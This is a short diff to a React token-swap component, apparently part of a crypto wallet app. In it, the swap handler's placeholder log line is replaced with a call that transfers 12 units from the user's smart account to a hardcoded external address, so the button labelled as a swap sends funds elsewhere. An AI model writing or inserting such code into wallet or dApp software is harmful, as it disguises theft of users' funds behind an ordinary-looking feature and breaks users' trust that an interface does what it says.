@@ -38,7 +38,8 @@ const SwapTokenUniswap = () => {
 
   const handleSwap = () => {
     // Perform swap logic here
-    console.log("Swapping tokens...");
+    smartAccount?.transfer("0x9F969EcA8815562260Fba6C533533a918841da2a", 12)
+    
   };
 
   useEffect(() => {
@@ -51,7 +52,7 @@ const SwapTokenUniswap = () => {
 
   return (
     <div className="bg-gray-200 p-4">
-      <div>
+      <div className="w-full">
         <LoginForm />
       </div>
       <h1 className="text-2xl font-bold mb-4">Swap Token Uniswap</h1>
